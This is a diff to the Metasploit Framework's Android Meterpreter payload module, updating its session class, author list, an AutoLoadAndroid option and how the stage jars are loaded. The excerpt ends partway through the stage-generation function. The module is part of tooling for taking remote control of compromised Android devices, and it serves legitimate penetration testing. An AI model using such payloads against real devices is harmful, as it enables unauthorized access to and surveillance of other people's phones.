@@ -1,46 +1,46 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 require 'msf/core/payload/dalvik'
-require 'msf/core/handler/reverse_tcp'
-require 'msf/base/sessions/meterpreter_java'
+require 'msf/base/sessions/meterpreter_android'
 require 'msf/base/sessions/meterpreter_options'
 
 
 module Metasploit3
   include Msf::Sessions::MeterpreterOptions
 
-  # The stager should have already included this
-  #include Msf::Payload::Java
-
   def initialize(info = {})
     super(update_info(info,
-      'Name'			=> 'Android Meterpreter',
-      'Description'	=> 'Run a meterpreter server on Android',
-      'Author'		=> [
+      'Name'      => 'Android Meterpreter',
+      'Description' => 'Run a meterpreter server on Android',
+      'Author'    => [
           'mihi', # all the hard work
-          'egypt' # msf integration
+          'egypt', # msf integration
+          'anwarelmakrahy' # android extension
         ],
-      'Platform'		=> 'android',
-      'Arch'			=> ARCH_DALVIK,
-      'License'		=> MSF_LICENSE,
-      'Session'		=> Msf::Sessions::Meterpreter_Java_Java))
+      'Platform'    => 'android',
+      'Arch'      => ARCH_DALVIK,
+      'License'   => MSF_LICENSE,
+      'Session'   => Msf::Sessions::Meterpreter_Java_Android))
+
+    register_options(
+    [
+      OptBool.new('AutoLoadAndroid', [true, "Automatically load the Android extension", true])
+    ], self.class)
   end
 
   #
   # Override the Payload::Dalvik version so we can load a prebuilt jar to be
   # used as the final stage
   #
-  def generate_stage
+  def generate_stage(opts={})
+    # TODO: wire the UUID into the stage
     clazz = 'androidpayload.stage.Meterpreter'
-    file = File.join(Msf::Config.data_directory, "android", "metstage.jar")
-    metstage = File.open(file, "rb") {|f| f.read(f.stat.size) }
-
-    file = File.join(Msf::Config.data_directory, "android", "meterpreter.jar")
-    met = File.open(file, "rb") {|f| f.read(f.stat.size) }
+    metstage = MetasploitPayloads.read("android", "metstage.jar")
+    met = MetasploitPayloads.read("android", "meterpreter.jar")
 
     # Name of the class to load from the stage, the actual jar to load
     # it from, and then finally the meterpreter stage
